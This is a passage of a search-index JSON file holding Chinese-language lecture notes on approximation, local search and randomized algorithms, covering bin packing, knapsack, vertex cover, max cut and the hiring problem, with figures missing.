</ul>"},{"location":"ZJU-course/ADS/ADS/#approximation","title":"\u8fd1\u4f3c\u7b97\u6cd5 Approximation","text":"<p>\u7528\u4e8e\u89e3\u51b3\u90a3\u4e9b\u76f8\u5bf9\u56f0\u96be\u7684\u95ee\u9898\uff0c\u662f\u5904\u7406NP-hard\uff0cNP-completeness\u7684\u95ee\u9898</p> <p>\u5bf9\u4e8eNPC\u95ee\u9898\uff0c\u6211\u4eec\u4f1a\u8003\u8651\u4e00\u4e9b\u60c5\u51b5</p> <ul> <li>\u95ee\u9898\u89c4\u6a21\u4e0d\u5927\uff0c\u597d\u89e3\u51b3</li> <li>\u4e00\u4e9bspecial cases\uff0c\u53ef\u4ee5\u5728\u591a\u9879\u5f0f\u65f6\u95f4\u5185\u89e3\u51b3</li> <li> <p>\u627e\u5230\u4e00\u4e2anear-optimal solutions\uff0c\u5728\u591a\u9879\u5f0f\u65f6\u95f4\u5185\u80fd\u89e3\u51b3\u7684</p> </li> <li> <p>approximation algorithm</p> </li> <li>heuristic algorithms\uff0c\u6bd4\u5982greedy\u7b97\u6cd5\uff0c\u8fd9\u79cd\u7b97\u6cd5\u4e5f\u662f\u4e3a\u4e86\u8fbe\u5230\u4e00\u4e2a\u8fd1\u4f3c\u6700\u4f18\u89e3\uff0c\u4f46\u662f\u533a\u522b\u5728\u4e8e\u6211\u4eec\u5f80\u5f80\u4e0d\u77e5\u9053\u8fd9\u4e2a\u8fd1\u4f3c\u7684\u7a0b\u5ea6\u662f\u591a\u5c11</li> </ul> <p>Approximation Ratio</p> <p>\u6211\u4eec\u8bf4\u4e00\u4e2a\\(\\rho(n)\\)-approximation algorithm\uff0c\u662f\u6307\u5bf9\u4e8e\u4efb\u610f\u4e00\u4e2ainput size n, \u5047\u8bbeC*\u662f\u6700\u4f18\u5316\uff0c\u6709\u53ef\u80fd\u662f\u6700\u5c0f\uff0c\u4e5f\u6709\u53ef\u80fd\u662f\u6700\u5927\u4ec0\u4e48\u7684</p> \\[ \\max(C/C^*,C^*/C)\\leq\\rho(n) \\] <p>approximation scheme</p> <p>polynomial-time approximation scheme(PTAS)</p> <p>\u200b\u200b</p>"},{"location":"ZJU-course/ADS/ADS/#approximate-bin-packing","title":"approximate bin packing","text":"<p>\u7ed9\u51faN\u4e2aitems\uff0c\u5b83\u4eec\u5404\u81ea\u7684size\u662f\\(S_1,S_2...S_N\\ 0&lt;S_i\\leq1\\) \uff0c\u6bcf\u4e2abin\u90fd\u662f1 size\u5927\u5c0f\uff0c\u95ee\u9700\u8981\u6700\u5c11\u51e0\u4e2abin\u53bb\u88c5\u8fd9\u4e9bitems\uff0c\u4e0b\u9762\u662f\u4e2a\u4f8b\u5b50</p> <p>\u200b\u200b</p> <p>\u5176\u5224\u5b9a\u7248\u672c\u662fNPC</p> <p>next fit</p> <p>\u8fd9\u4e2a\u7b97\u6cd5\u5f88\u7b80\u5355\uff0c\u987a\u5e8f\u4f7f\u7528\u6211\u4eec\u7684bin\u5e8f\u5217\uff0c\u5982\u679c\u5f53\u524d\u80fd\u653e\u4e0b\uff0c\u5c31\u653e\uff1b\u5982\u679c\u5f53\u524d\u653e\u4e0d\u4e0b\uff0c\u5c31\u65b0\u5f00\u4e00\u4e2abin\uff0c\u653e</p> <p>\u200b\u200b</p> <p>\u8fd9\u662f\u5176\u4f2a\u4ee3\u7801\uff0c\u5f88\u663e\u7136\u65f6\u95f4\u590d\u6742\u5ea6\u662fO\uff08N\uff09\u7684\u5e76\u4e14\u6211\u4eec\u76f4\u5230\u5bf9\u4e8eM\u662f\u6700\u4f18\u89e3\u7684\u60c5\u5f62\uff0c\u4f7f\u7528next fit\u7684bins\u7684\u6570\u91cf\u4e0d\u4f1a\u8d85\u8fc72M-1\uff0c\u5e76\u4e14\u5b58\u5728\u5e8f\u5217\u53ef\u4ee5\u53d6\u52302M-1</p> <p>\u662f2-Approximation</p> <p>\u8bc1\u660e\u4e5f\u633a\u7b80\u5355\uff0c\u628anext fit\u7684\u7ed3\u679c\u5e8f\u5217\u5b9a\u4e49\u6210B1,B2...</p> <p>\u5b58\u5728\\(S(B_i)+S(B_{i+1}) &gt; 1\\)\uff0c\u53ef\u8bc1</p> <p>first fit</p> <p>\u5c31\u662fnext fit\u7684\u8fdb\u9636\u7248\uff0c\u6bcf\u6b21\u5c31\u904d\u5386\u6574\u4e2a\u5e8f\u5217\uff0c\u627e\u4e0d\u5230\uff0c\u518d\u5f00\u65b0bin</p> <p>\u200b\u200b</p> <p>\u7ed3\u679c\u662f\u5176\u6700\u574f\u60c5\u51b5\u4f1a\u523017M/10\u7684\u4f18\u5316\u60c5\u5f62</p> <p>best fit</p> <p>BF \u7b56\u7565\u603b\u662f\u9009\u62e9\u80fd\u591f\u5bb9\u7eb3\u5f53\u524d item \u4e14\u5269\u4f59\u7a7a\u95f4\u6700\u5c0f\u7684 bin\uff08\u5373 tightest\uff09\uff0c\u82e5\u6240\u6709 bin \u90fd\u65e0\u6cd5\u5bb9\u7eb3\u5f53\u524d item\uff0c\u5219\u65b0\u5f00\u4e00\u4e2a bin\u3002</p> <p>\u5176\u65f6\u95f4\u590d\u6742\u5ea6\u548c\u4f18\u5316\u6700\u574f\u60c5\u51b5\uff0c\u4e0eFirst Fit\u76f8\u540c</p> <p>on-line algorithms</p> <p>\u5904\u7406\u7684\u987a\u5e8f\u603b\u662f\u56fa\u5b9a\u7684\u5e76\u4e14\u6211\u4eec\u6ca1\u6cd5\u64a4\u9500\u4e4b\u524d\u7684\u64cd\u4f5c\uff0c\u4e0a\u8ff0\u4e09\u4e2a\u7b97\u6cd5\u90fd\u662f\u5c5e\u4e8eon-line\uff0c\u6240\u6709on-line\u7b97\u6cd5\u53ea\u80fd\u8fbe\u52305/3 \u7684\u4f18\u5316</p> <p>off-line algorithms</p> <p>\u518d\u751f\u6210\u7b54\u6848\u4e4b\u524d\uff0c\u6211\u4eec\u5148view\u4e00\u904d\u6574\u4e2aitem list\uff0c\u9996\u5148sort items\u53d8\u6210non-increasing size\u7684\u5f62\u5f0f\uff0c\u7136\u540e\u6267\u884c first fit / best fit</p> <p>\u200b\u200b</p>"},{"location":"ZJU-course/ADS/ADS/#knapsack-problem","title":"knapsack problem","text":"<p>\u80cc\u5305\u95ee\u9898\u6709\u7b80\u5355\u548c\u56f0\u96be\u4e24\u79cd\u7248\u672c</p> <p>\u6709\u4e00\u4e2a\u5bb9\u91cf\u4e3aM\u7684\u80cc\u5305\uff0c\u6709N\u4e2aitems\uff0c\u7b2ci\u4e2aitem\u7684\u91cd\u91cf\u662f\\(w_i\\)\uff0c\u5176\u5229\u6da6\u662f\\(p_i\\)\uff0c\u5728\u4e0d\u8d85\u8fc7\u5bb9\u91cf\u7684\u60c5\u51b5\u4e0b\uff0c\u4f7f\u5f97\u5229\u6da6\u6700\u5927\u5316</p> <p>\u5bf9\u4e8eitem\u7684\u53ef\u5206\u6027\uff0c\u53ef\u4ee5\u5206\u4e3a\u4e24\u4e2a\u7248\u672c</p> <ul> <li>fraction version item \u53ef\u4ee5\u62ff\u4e00\u90e8\u5206 \u6211\u4eec\u53ea\u8981\u62ffmaximum profit density p/w\u5373\u53ef</li> <li>0-1 version NPC\u95ee\u9898 NP-hard \u95ee\u9898</li> </ul> <p>0-1 version</p> <p>\u9996\u5148\u6765\u770b\u4e2a\u4f8b\u5b50</p> <p>\u200b\u200b</p> <p>\u63a5\u4e0b\u6765\u6211\u4eec\u8003\u8651\u5982\u4f55greedy</p> <ul> <li>\u53ef\u4ee5\u8003\u8651\u6839\u636eprofit\u8d2a\u5fc3\uff0c\u90a3\u4e2ap\u6700\u5927\u62ff\u54ea\u4e2a</li> <li>\u4e5f\u53ef\u4ee5\u6839\u636e profit density \u8d2a\u5fc3\uff0c\u5c31\u662f\u6839\u636ep/w\u8d2a\u5fc3\uff0c\u8fd9\u6837\u6211\u4eec\u7b2c\u4e00\u6b65\u4f1a\u9009\u62e9 i = 5</li> </ul> <p>\u5bf9\u4e8e\u8fd9\u4e24\u79cdgreedy\u5f62\u5f0f\uff0cApproximation ratio is 2</p> <p>\u8bc1\u660e</p> <p>\u200b\u200b</p> <p>\u5176\u4e2d\\(p_{max}\\)\u662f\u6240\u6709item\u91cc\u7684\u6700\u5927\u5229\u6da6\uff0c\u8fd9\u91cc\u6bd4\u8f83\u96be\u7406\u89e3\u7684\u662f\u6700\u4f18\u89e3\u5c0f\u4e8e\u7b49\u4e8e\u8d2a\u5fc3\u89e3+\u6700\u5927\u5229\u6da6\uff0c\u4f46\u662f\u6211\u4eec\u77e5\u9053</p> <p>\u200b\u200b</p> <p>01\u7248\u672c\u6700\u4f18\u89e3\u662f\u5c0f\u4e8efraction \u7248\u672c\u6700\u4f18\u89e3\u7684\uff0c\u56e0\u6b64\u53ea\u9700\u8981\u8bc1\u660efrac &lt; greedy + max\uff0c \u56e0\u4e3afrac \u548c greedy \u90fd\u662f\u53ef\u4ee5\u6309\u7167 profit density \u53bb\u89e3\u51b3\uff0c\u56e0\u6b64\u5bb9\u6613\u8bc1\u660e</p> <p>\u200b\u200b</p> <p>\u6211\u4eec\u6765\u8003\u8651DP\u7684\u89e3\u6cd5</p> <p>DP\u5bf9\u4e8e\u80cc\u5305\u95ee\u9898\u7684\u89e3\u6cd5\u5e76\u4e0d\u552f\u4e00</p> <p>\u9996\u5148\u6211\u4eec\u5047\u8bbe\\(W_{i,p}\\) \u662f\u6307minimum weight of a collection from {1....i} with total profit being exactly p</p> <p>\u6bcf\u4e00\u6b65\u6709\u4e09\u79cd\u60c5\u51b5</p> <p>\u200b\u200b</p> <p>\u5176\u5f62\u6210\u7684\u8868\u8fbe\u5f0f\u5982\u4e0b</p> <p>\u200b\u200b</p>"},{"location":"ZJU-course/ADS/ADS/#local-search","title":"Local Search","text":"<p>\u4e5f\u662f\u4e00\u79cd\u8fd1\u4f3c\u7684\u505a\u6cd5\uff0c\u83b7\u53d6local optimum\u3002\u5bf9\u4e8elocal search\u800c\u8a00\u5b58\u5728\u4e24\u4e2a\u5173\u952e\u8bcd</p> <ul> <li>local \u9700\u8981\u6211\u4eec\u5b9a\u4e49neighborhood\u8fd9\u4e2a\u6982\u5ff5\uff0c\u5e76\u4e14\u5728local\u8303\u56f4\u5185\u53ef\u4ee5\u83b7\u5f97\u6700\u4f18\u89e3\u51b3</li> </ul> <p>local search \u548c greedy \u7684\u533a\u522b</p> <p>\u200b\u200b</p>"},{"location":"ZJU-course/ADS/ADS/#vertex-cover","title":"vertex cover","text":"<p>\u7ed9\u4e00\u4e2a\u65e0\u5411\u56fe\\(G=(V,E)\\)\u548c\u4e00\u4e2a\u6574\u6570\\(K\\)\uff0c\u95ee\\(G\\)\u662f\u5426\u5b58\u5728\u4e00\u4e2a\u9876\u70b9\u7684\u5b50\u96c6\\(V'\\)\uff0c\u5176\u4e2d\\(V'\\)\u7684size\u5c0f\u4e8e\u7b49\u4e8e\\(K\\)\uff0c\u4f7f\u5f97\\(G\\)\u4e2d\u6bcf\u4e00\u6761\u8fb9\uff0c\u81f3\u5c11\u6709\u4e00\u4e2a\u9876\u70b9\u5728\\(V'\\)</p> <p>\u4e0a\u8ff0\u662f\u5176\u5224\u5b9a\u7248\u672c\uff0c\u5176\u5b9e\u672c\u8d28\u662f\u5c31\u662f\u9700\u8981\u627e\u51fa\u4e00\u4e2a\u6ee1\u8db3\u6761\u4ef6\u7684\u6700\u5c0f\u70b9\u96c6\u5408\\(V'\\)</p> <p>\u6211\u4eec\u5b9a\u4e49\u8fd9\u6837\u4e00\u4e2a\u96c6\u5408\\(S\\)\u5176\u5b58\u50a8\u6240\u6709\u7684vertex cover\u4e5f\u5c31\u662f\u6240\u6709\u6ee1\u8db3\u89e3\u7684\u96c6\u5408</p> <ul> <li>\u5b9a\u4e49cost\u51fd\u6570 \\(cost(S) = |S|\\) \u5c31\u662f\u89e3\u7684size</li> <li>\u5b9a\u4e49\u6b65\u957f\uff1a\\(S\\rightarrow S'\\) \u8bf4\u660e$S \\(\u80fd\u901a\u8fc7\u5220\u9664\u6216\u589e\u52a0\u4e00\u4e2anode\u5230\u8fbe\\)S'$</li> <li>\u5b9a\u4e49start \u5f88\u663e\u7136\uff0cV\u7684\u5168\u96c6\u5c31\u662fS\u4e2d\u7684\u4e00\u4e2a\u89e3</li> </ul> <p>\u5982\u679c\u6211\u4eec\u5355\u7eaf\u91c7\u7528\u968f\u673a\u987a\u5e8f\u5220\u9664\u7136\u540e\u68c0\u67e5\u662f\u5426\u6709\u6548\u7684\u65b9\u6cd5\uff0c\u5f88\u591a\u60c5\u51b5\u4e0b\u662f\u65e0\u6cd5\u6784\u5efa\u51fa\u6700\u4f18\u89e3\u7684\u3002</p> <p>The Metropolis Algorithm</p> <p>\u5177\u4f53\u7684\u505a\u6cd5\u5c31\u662f\u7528\u4e00\u4e2a\u6982\u7387\u53bb\u6a21\u62df\u8303\u56f4\u641c\u7d22\u7684\u529b\u5ea6</p>"},{"location":"ZJU-course/ADS/ADS/#hopfield-neural-networks","title":"Hopfield Neural Networks","text":"<p>\u6709\u4e00\u4e2a\u56fe\\(G=(V,E)\\)\u5176\u4e2d\u7684\u8fb9\u90fd\u662f\u6709\u6743\u91cd\u7684\uff0c\u5e76\u4e14\u6743\u91cd\u4e3a\u6574\u6570\uff0c\u53ef\u6b63\u53ef\u8d1f</p> <p>\u5982\u679c\u4e24\u70b9\u4e4b\u95f4\u7684\u6743\u91cd\u5c0f\u4e8e0\uff0c\u90a3\u4e48\u8bbe\u5b9a\u8be5\u4e24\u70b9\u60f3\u8981\u5728\u540c\u4e00state\u4e2d\uff1b\u53cd\u4e4b\uff0c\u5219\u8bbe\u5b9a\u4e24\u70b9\u4e0d\u60f3\u5728\u540c\u4e00state\u4e2d\uff0c\u6743\u91cd\u7684\u7edd\u5bf9\u503c\uff0c\u8868\u793a\u4e86\u8fd9\u79cd\u8981\u6c42\u7684\u5f3a\u5ea6</p> <p>\u8fd9\u4e2a\u95ee\u9898\u7684\u89e3\u81ea\u7136\u662f\u4e00\u79cd\u5212\u5206\uff0c\u8fd9\u4e2a\u5212\u5206\u53ea\u9700\u8981\u628a\u70b9\u5206\u4e3a\u9ed1\u70b9\u767d\u70b9\u5373\u53ef\uff0c\u53ea\u8981\u4e24\u70b9\u76f8\u8fde\u4e14\u989c\u8272\u76f8\u540c\uff0c\u5373\u4e3a\u540c\u4e00state\uff0c\u4f46\u662f\u5982\u4f55\u5224\u5b9a\u4e00\u4e2a\u5212\u5206\u662f\u8db3\u591f\u597d\u7684\u5462\uff0c\u6211\u4eec\u505a\u51fa\u4e86\u5982\u4e0b\u5224\u5b9a</p> <p>\u200b\u200b</p> <p>\u8fd9\u662f\u5bf9\u4e8e\u4e00\u6761\u8fb9\u7684\u5224\u5b9a\uff0c\u5bf9\u4e8e\u4e00\u4e2a\u70b9\u6765\u8bf4\u5982\u679c\u628a\u4e0e\u5176\u76f8\u5173\u7684\u6240\u6709\u8fb9\u4e4b\u548c\u52a0\u8d77\u6765\u4ecd\u4e3a\u8d1f\u6570\uff0c\u90a3\u4e48\u8fd9\u4e2a\u89e3\u5c31\u662fsatisfied\u3002\u5bf9\u4e8e\u6574\u4e2a\u56fe\u6765\u8bf4\uff0c\u5982\u679c\u628a\u6240\u6709\u70b9\u90fd\u662fsatisfied\uff0c\u8fd9\u4e2a\u89e3\u662fstable</p> <p>\u5177\u4f53\u7684local search\u7b97\u6cd5\u5982\u4e0b</p> <p>\u200b\u200b</p> <p>\u6211\u4eec\u901a\u8fc7\u4e00\u4e2a\u7b80\u5355\u7684\u4f8b\u5b50\u5c31\u4f1a\u53d1\u73b0\uff0c\u4e00\u4e9bnode\u7ecf\u5e38\u53cd\u590d\u53d8\u6362\u989c\u8272\uff0c\u90a3\u4e48\u5c31\u884d\u751f\u51fa\u4e00\u4e2a\u7591\u95ee\uff0c\u8fd9\u7b97\u6cd5\u771f\u7684\u4e00\u5b9a\u7ec8\u6b62\u5417\uff1f</p> <p>\u7b54\u6848\u662f\u4f1a\u7ec8\u6b62\u7684\uff0c\u5176\u8fed\u4ee3\u7684\u6b21\u6570\u6700\u5927\u662f\u6240\u6709\u8fb9\u6743\u91cd\u7684\u7edd\u5bf9\u503c\u4e4b\u548c\u3002\u6211\u4eec\u6bcf\u6b21\u628anode\u53d8\u8272\u4e4b\u540e\uff0c\u5176\u6240\u6709good edge\u90fd\u53d8bad\uff0c\u6240\u6709bad edge\u90fd\u53d8good\uff0c\u5176\u4f59edge\u7ef4\u6301\u76f8\u540c\u3002</p> <p>\u5f53\u6211\u4eec\u53d8\u52a8node\u7684\u65f6\u5019\uff0cnode\u7684good edge\u7684\u6743\u91cd\u4e00\u5b9a\u5c11\u4e8ebad edge\u7684\u6743\u91cd\u3002\u6709\u56e0\u4e3a\u6743\u91cd\u5fc5\u5b9a\u662f\u6574\u6570\uff0c\u6240\u4ee5\u6bcf\u4e00\u6b21\u53d8\u8272</p> \\[ \\phi(S')\\ge \\phi(S)+1 \\] <p>\u6240\u4ee5\u5176\u52bf\u5fc5\u4f1a\u7ec8\u6b62\uff0c\u56e0\u4e3a\\(\\phi(S)\\)\u662f\u6709\u4e0a\u754c\u7684</p> <p>is it a polynomial time algorithm</p> <p>\u6211\u4eec\u8bbeW\u662f\u6700\u4f18\u89e3\u7684\u6743\u91cd\u503c\uff0c\u5176\u80af\u5b9a\u662f\u4e00\u4e2a\u786e\u5b9a\u503c\uff0c\u90a3\u4e48\u4e00\u6b21\u6700\u5c11\u589e\u957f1\uff0c\u90a3\u4e48\u65f6\u95f4\u590d\u6742\u5ea6\u4e3a\\(O(W)\\)\uff0c\u4f46\u7531\u4e8e\u8f93\u5165\u662fW\u7684bit\u6570\uff0c\u56e0\u6b64\u5176\u5e76\u975e\u4e00\u4e2a\u7ebf\u6027\u7b97\u6cd5\uff0c\u662f\u5426\u80fd\u591f\u627e\u5230\u4e00\u4e2alogW\u7684\u7b97\u6cd5\uff0c\u76ee\u524d\u8fd8\u6ca1\u6709\u5b9a\u8bba</p>"},{"location":"ZJU-course/ADS/ADS/#maximum-cut","title":"Maximum Cut","text":"<p>\u95ee\u9898\u63cf\u8ff0\uff1a\u4e00\u4e2a\u65e0\u5411\u56fe\\(G=(V,E)\\)\uff0c\u8fb9\u7684\u6743\u91cd\u90fd\u662f\u6b63\u6574\u6570\uff0c\u628anode\u5212\u5206\u6210A\u7ec4\u548cB\u7ec4\uff08find a node partition\uff09\uff0c\u9700\u8981\u7a7f\u8fc7A\u548cB\u7684\u8fb9\u6743\u91cd\u4e4b\u548c\u6700\u5927</p> <p>\u200b\u200b</p> <p>\u8fd8\u662f\u6765\u770b\u4e09\u8981\u7d20</p> <ul> <li>\u95ee\u9898\uff1amaximize w(A,B)</li> <li>feasible solution set\uff1a\u4efb\u610f\u4e00\u4e2anode partition</li> <li>\\(S \\rightarrow S'\\) \u5c06\u4e00\u4e2anode\u4eceA\u79fb\u52a8\u5230B\uff0c\u6216\u8005\u4eceB\u79fb\u52a8\u5230A</li> </ul> <p>\u662fhopfield neural network\u7684\u7279\u4f8b\uff0c\u56e0\u6b64\u6211\u4eec\u4e5f\u53ef\u4ee5\u5b9a\u4e49\u51faIsStable()</p> <p>quality of local optimum</p> <p>\u5bf9\u4e8e\u4e0a\u8ff0\u4e09\u8981\u7d20\u6784\u6210\u7684\u7b80\u5355\u7b97\u6cd5\uff0c\u6211\u4eec\u6709\u5982\u4e0b\u7ed3\u8bba</p> <p>\u200b\u200b</p> <p>\u200b\u200b</p> <p>\u5b9e\u9645\u4e0a\u6211\u4eec\u5b58\u5728\u4e00\u4e9b\u66f4\u597d\u7684\u7b97\u6cd5\uff0c\u4f46\u662f\u5728\u6b64\u4e0d\u505a\u8be6\u7ec6\u4ecb\u7ecd</p> <p>\u964d\u4f4e\u65f6\u95f4\u590d\u6742\u5ea6</p> <p>\u6211\u4eec\u53ef\u4ee5\u91c7\u7528Big-improvement-flip\uff0c\u8bbe\u7f6e\u4e00\u4e2a\u503c\uff0c\u5f53\u4e00\u6b21flip\u7684\u4f18\u5316\u5c0f\u4e8e\u8fd9\u4e2a\u503c\u7684\u65f6\u5019\uff0c\u5c31\u505c\u6b62\u7b97\u6cd5\u3002</p> <p>\u200b\u200b</p>"},{"location":"ZJU-course/ADS/ADS/#randomized-algorithm","title":"Randomized Algorithm","text":"<p>\u4ec0\u4e48\u662f\u968f\u673a</p> <ul> <li>the world behaves randomly \u8f93\u5165\u7684\u968f\u673a\uff0c\u4e3b\u8981\u662f\u505a\u4e00\u822c\u60c5\u51b5\u5206\u6790</li> <li> <p>the algorithm behaves randomly \u7b97\u6cd5\u7684\u968f\u673a\uff0c\u5b58\u5728\u968f\u673a\u51b3\u7b56</p> </li> <li> <p>Pr[A] \u662fA\u53d1\u751f\u6982\u7387</p> </li> <li>E[X] \u662f\u53d8\u91cfX\u7684\u671f\u671b\u503c\uff0c\u5176\u5b58\u5728\u4e0b\u56fe\u7b49\u5f0f</li> </ul> <p>\u200b\u200b</p>"},{"location":"ZJU-course/ADS/ADS/#hiring-problem","title":"hiring problem","text":"<p>\u5047\u8bbe\u6709\u4e00\u5bb6\u516c\u53f8\u8981\u62db\u4eba\uff0c\u4e00\u5171\u62dbN\u4e2a\u5019\u9009\u4eba\uff0c\u6bcf\u4e2a\u5019\u9009\u4eba\u9762\u8bd5\u4e4b\u540e\u4f1a\u5f97\u5230\u4e00\u4e2a\u5206\u6570\uff0c\u6211\u4eec\u5b58\u5728\u4e00\u4e2a\u7ea6\u675f\u662f\u6211\u4eec\u5fc5\u987b\u5728\u9762\u8bd5\u7ed3\u675f\u540e\u9a6c\u4e0a\u786e\u5b9a\u8981\u4e0d\u8981\u96c7\u4f63\u4ed6\uff0c\u9762\u8bd5\u7684\u82b1\u8d39\u662f\\(C_i\\)\u96c7\u4f63\u7684\u82b1\u8d39\u662f\\(C_h\\)\uff0c\u9762\u8bd5\u7684\u82b1\u8d39\u8fdc\u5c0f\u4e8e\u96c7\u4f63\uff0c\u4e00\u5171\u8981\u96c7\u4f63M\u4e2a\u4eba</p> <p>\u200b\u200b</p> <p>\u200b\u200b</p> <p>\u4e0a\u8ff0\u8fd9\u4e2a\u7b97\u6cd5\u5c31\u662f\u7ef4\u62a4\u4e00\u4e2a\u6700\u4f18\u8d28\u91cf\uff0c\u5982\u679c\u65b0\u7684\u9762\u8bd5\u8005\u4f18\u4e8e\u6700\u4f18\u8d28\u91cf\uff0c\u5c31\u62db\u52df\u5e76\u4e14\u66f4\u65b0\u6700\u4f18\u8d28\u91cf</p> <p>\u8fd9\u4e2a\u7b97\u6cd5\u7684\u4f18\u52bf\u662f\u4fdd\u8bc1\u6211\u4eec\u53ef\u4ee5\u83b7\u53d6\u5230\u6700\u4f18\u8d28\u91cf\u7684\u9762\u8bd5\u8005\uff0c\u4f46\u662f\u7f3a\u9677\u5728\u4e8e\u5982\u679c\u9762\u8bd5\u8005\u7684\u8d28\u91cf\u9012\u589e\u5730\u6765\uff0c\u4f1a\u9020\u6210\u8f83\u5927\u7684\u82b1\u8d39\u5f00\u9500\\(O(NC_h)\\)</p> <p>\u968f\u673a\u7b97\u6cd5</p> <p>\u5047\u8bbe\u9762\u8bd5\u8005\u968f\u673a\u5730\u6765\uff0c\u4f46\u6211\u4eec\u65e0\u6cd5\u964d\u4f4e\u9762\u8bd5\u7684\u6b21\u6570\uff0cX\u662f\u6211\u4eec\u96c7\u4f63\u7684\u4eba\u6570\uff0c\u5176\u671f\u671b\u53ef\u4ee5\u5199\u6210</p> \\[ E[X]=\\sum_{j=1}^{N}j*Pr[X=j] \\] <p>\u53ef\u4ee5\u628a\u671f\u671b\u95ee\u9898\u8f6c\u6362\u6210\u6982\u7387\u95ee\u9898\uff0c\u6211\u4eec\u53ef\u4ee5\u505a\u5982\u4e0b\u8bbe\u8ba1</p> <p>\u200b\u200b</p> <p>\u200b\u200b</p> <p>\u6211\u4eec\u901a\u8fc7\u4e00\u7cfb\u5217\u8f6c\u6362\uff0c\u5c06E[X]\u7684\u8ba1\u7b97\u8f6c\u6362\u6210\u4e86E[Xi]\u7684\u8ba1\u7b97\uff0c\u6211\u4eec\u9700\u8981\u63d0\u4f9b\u8be5\u9762\u8bd5\u8005\u88ab\u96c7\u4f63\u7684\u6761\u4ef6\uff0c\u5728\u8fd9\u91cc\u6211\u4eec\u8bbe\u8ba1\u4e3a\u5982\u679c\u4ed6\u662f\u524di\u4e2a\u4eba\u4e2d\u6700\u4f18\u7684\uff0c\u90a3\u4e48\u5c31\u96c7\u4f63\u4ed6\uff0c\u5e76\u4e14\u5047\u8bbe\u524di\u4e2acandidates\u6709\u76f8\u540c\u7684\u53ef\u80fd\u6027\u6210\u4e3a\u8fd9i\u4e2a\u4eba\u4e2d\u6700\u4f18\u8d28\u91cf\u7684candidate\uff0cE[xi] = 1/i </p> <p>\u4f46\u662f\u4ec5\u51ed\u8fd9\u4e9b\u4fe1\u606f\u4f9d\u65e7\u65e0\u6cd5\u8ba1\u7b97\uff0c\u6211\u4eec\u9700\u8981\u505a\u51fa\u5047\u8bbe\uff0c\u524di\u4e2acandidates\u6709\u76f8\u540c\u7684\u53ef\u80fd\u6027\u6210\u4e3a\u6700\u4f18\u8d28\u91cf\u7684candidate</p> <p>\u6240\u4ee5\uff0c\u6211\u4eec\u7684\\(Pr[X_i=1]=1/i\\) \uff0c\u5e76\u4e14\u4e5f\u6709\\(E[X_i]=1/i\\) \uff0c\u603b\u5f97\\(E[X]=\\sum_{i=1}^{N}E[X_i]=\\sum1/i=lnN+O(1)\\) </p> <p>\u7531\u6b64\u53ef\u4ee5\u63a8\u51fa\uff0c\u603b\u5f97\u6d88\u8017\u662f\\(O(C_h*lnN+NC_i)\\) </p> <p>\u200b\u200b</p> <p>\u968f\u673a\u7f6e\u6362\u7b97\u6cd5</p> <p>\u5982\u4f55\u5b9e\u8df5\u8fd9\u4e2a\u968f\u673a\uff0c\u6bcf\u4e2a\u4eba\u968f\u673a\u62ff\u4e2a\u503c\uff0c\u7136\u540e\u6392\u5e8f</p> <p>\u200b\u200b</p> <p>online hiring algorithm</p> <p>\u8fd9\u4e2a\u7b97\u6cd5\u5173\u952e\u5728\u4e8e\u6211\u4eec\u786e\u4fdd\u53ea\u96c7\u4f63\u4e00\u6b21\uff0c\u5148\u627e\u51fa\u524dk\u4e2acandidates\u4e2d\u7684\u6700\u4f18\u8d28\u91cf\uff0c\u7136\u540e\u5728k-N\u91cc\u9762\u627e\u5230\u7b2c\u4e00\u4e2a\u4f18\u4e8e\u8fd9\u4e2a\u6700\u4f18\u8d28\u91cf\u7684\uff0c\u5e76\u4e14\u96c7\u4f63\u5b83</p> <p>\u200b\u200b</p> <p>\u5bf9\u4e8e\u4e0a\u8ff0\u7b97\u6cd5\uff0c\u6211\u4eec\u6709\u4e24\u4e2a\u95ee\u9898</p> <ul> <li>\u7ed9\u5b9ak\uff0c\u6211\u4eec\u627e\u5230\u7684\u90a3\u4e2acandidate\u662f\u6700\u4f18candidate\u7684\u6982\u7387\u662f\u591a\u5c11</li> <li>k\u7684\u503c\u4e3a\u591a\u5c11\u7684\u65f6\u5019\u6700\u4f18</li> </ul> <p>\u6211\u4eec\u8bb0\u5f55\\(S_i\\)\u662f\u6307\u96c7\u4f63\u5230\u7b2ci\u4e2acandidate\uff0c\u5e76\u4e14\u5176\u662f\u6700\u597d\u7684\uff0c\u90a3\u4e48\u6211\u4eec\u96c7\u4f63\u5230\\(S_i\\)\u7684\u6982\u7387\u9700\u8981\u4e24\u4e2a\u4e8b\u4ef6\u76f8\u4e58\uff0c\u7b2ci\u4e2a\u662f\u6700\u597d\u7684(A)\u548c\u4ecek+1\u5230i-1\u65e0\u4eba\u88ab\u96c7\u4f63(B)</p> \\[ Pr[S_i]=Pr[A]*Pr[B] \\] <p>\u6211\u4eec\u5047\u8bbe\uff0c\u6bcf\u4e2a\u4eba\u7684\u4f18\u79c0\u6982\u7387\u662f\u76f8\u540c\u7684\uff0c\u90a3\u4e48Pr[A]\u5f88\u663e\u7136\u5c31\u662f1/N</p> <p>\u5bf9\u4e8ePr[B]\u800c\u8a00\uff0c\u6211\u4eec\u9996\u5148\u53d1\u73b01~i-1\u4e4b\u95f4\uff0c\u6bcf\u4e2acandidate\u662f\u6700\u4f18\u7684\u6982\u7387\u662f1/(i-1)\uff0c\u5e76\u4e14\u4e8b\u4ef6\u53d1\u751f(i-1-k-1+1)\u6b21\uff0c\u56e0\u6b64B\u5931\u8d25\u7684\u6982\u7387\u662f\u4e24\u8005\u76f8\u4e58\uff0c\u53cd\u6b63B\u6210\u529f\u7684\u6982\u7387\u5c31\u662f1-\u5931\u8d25\u6982\u7387k/(i-1)\uff0c\u4e2d\u95f4\u6240\u6709\u9879\u6570\u90fd\u53ef\u4ee5\u6d88\u6389\uff0c\u53d8\u6210 k / \uff08i-1\uff09\u540c\u65f6\u4e5f\u8868\u793a\u7740\u8fd9i - 1\u91cc\u9762\uff0c\u6700\u4f18\u7684\u5728\u524dk\u4e2a\uff0c\u6240\u4ee5\u4e3ak / i-1</p> \\[ Pr[S_i] = 1/N *k/(i-1)=\\frac{k}{N*(i-1)} \\] <p>\u200b\u200b</p> <p>\u7531\u4e0a\u8ff0\u5f0f\u5b50\uff0c\u6211\u4eec\u5c31\u53ef\u4ee5\u89e3\u51b3\u4e24\u4e2a\u95ee\u9898\uff0c\u987a\u4fbf\u8fd8\u80fd\u627e\u5230\u5176\u627e\u5230\u6700\u4f18candidate\u7684\u6700\u4f4e\u6982\u7387\uff0ck = N/e  \u6700\u4f73\uff0c1 / e \u6700\u4f73\u6982\u7387</p> 